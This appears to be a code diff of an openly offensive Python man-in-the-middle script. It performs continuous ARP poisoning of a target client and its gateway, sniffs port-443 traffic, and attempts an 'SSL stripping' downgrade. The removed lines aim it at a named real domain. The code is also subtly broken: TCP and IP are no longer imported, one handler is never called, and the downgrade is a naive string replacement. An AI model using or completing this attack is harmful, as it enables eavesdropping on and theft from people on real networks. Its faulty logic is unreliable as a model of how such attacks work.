@@ -1,78 +1,91 @@
 import socket
 import threading
-from scapy.all import *
 import ssl
+import time
+from scapy.all import ARP, Ether, srp, sniff, send
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
-# Define the target and port for SSL stripping
-TARGET_HOST = "zsbitovska.cz"
-TARGET_PORT = 443
-HTTP_PORT = 80
+# Define the target network
+TARGET_IP = "10.0.1.33"  # Target client IP (replace with your target IP)
+ROUTER_IP = "10.0.1.138"   # Router IP (your gateway)
+GATEWAY_IP = "10.0.1.138"  # Gateway router IP
+PORT = 443  # SSL Port
+
+# Function to perform ARP Spoofing
+def arp_spoof(target_ip, gateway_ip):
+    target_mac = get_mac(target_ip)
+    gateway_mac = get_mac(gateway_ip)
+
+    # Send ARP requests to poison the target and gateway
+    arp_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
+    arp_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
+
+    send(arp_target, verbose=False)
+    send(arp_gateway, verbose=False)
+
+# Function to get the MAC address of an IP
+def get_mac(ip):
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
+    for _, rcv in ans:
+        return rcv[Ether].src
+    return None
 
 # Function to handle client communication
 def handle_client(client_socket):
     request = client_socket.recv(1024)
-    
-    # If the request is an HTTPS request, downgrade it to HTTP
+
     if b"HTTPS" in request:
-        # Modify the request to be an HTTP request (removing the HTTPS part)
+        # Strip SSL by downgrading the request to HTTP
         request = request.replace(b"HTTPS", b"HTTP")
-        
-    # Forward the modified request to the target server (HTTP port)
+
+    # Forward the modified request to the target server on HTTP (port 80)
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as forward_socket:
-        forward_socket.connect((TARGET_HOST, HTTP_PORT))
+        forward_socket.connect((TARGET_IP, 80))
         forward_socket.send(request)
-        
-        # Receive the response from the target
+
+        # Receive response from the target server
         response = forward_socket.recv(4096)
-        
-        # Send the response back to the client
+
+        # Send the response back to the client (simulate HTTP)
         client_socket.send(response)
 
     client_socket.close()
 
-# Function to listen for incoming connections
-def start_sniffer():
-    sniff(filter="tcp port 443", prn=packet_callback, store=0)
-
-# Packet callback function for sniffing packets
+# Start sniffing the traffic
 def packet_callback(packet):
     if packet.haslayer(TCP) and packet.haslayer(IP):
-        if packet[TCP].dport == TARGET_PORT:
-            print(f"Intercepted traffic to {TARGET_HOST}:{TARGET_PORT}")
-            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client_socket.connect((TARGET_HOST, TARGET_PORT))
+        if packet[TCP].dport == PORT:
+            print(f"Intercepted traffic to {TARGET_IP}:{PORT}")
 
-            # Send an HTTP request instead of HTTPS
-            request = f"GET / HTTP/1.1\r\nHost: {TARGET_HOST}\r\nConnection: close\r\n\r\n"
+            # Create a socket for communication
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.connect((TARGET_IP, PORT))
+
+            # Send HTTP instead of HTTPS
+            request = f"GET / HTTP/1.1\r\nHost: {TARGET_IP}\r\nConnection: close\r\n\r\n"
             client_socket.send(request.encode())
 
-            # Receive HTTP response
+            # Receive the response
             response = client_socket.recv(4096)
 
-            # Send back to the client, simulating HTTP
-            print(f"Sending downgraded HTTP response to the client")
+            # Send back to the client
+            print(f"Sending downgraded HTTP response to client")
             client_socket.close()
 
-# Start the server to handle SSL stripping
-def ssl_stripping_server():
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.bind(("0.0.0.0", 443))
-    server_socket.listen(5)
-    
+# ARP Spoofing thread
+def start_arp_spoof():
     while True:
-        client_socket, addr = server_socket.accept()
-        print(f"Connection from {addr}")
-        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
-        client_handler.start()
+        arp_spoof(TARGET_IP, GATEWAY_IP)
+        time.sleep(2)
 
-# Run the sniffer and server simultaneously
+# Main function to run the attack
 def main():
-    # Start sniffing the traffic in a background thread
-    sniffer_thread = threading.Thread(target=start_sniffer)
-    sniffer_thread.start()
+    # Start ARP poisoning
+    arp_thread = threading.Thread(target=start_arp_spoof)
+    arp_thread.start()
 
-    # Start the SSL stripping server
-    ssl_stripping_server()
+    # Start sniffing and handling packets
+    sniff(filter="tcp port 443", prn=packet_callback, store=0)
 
 if __name__ == "__main__":
     main()
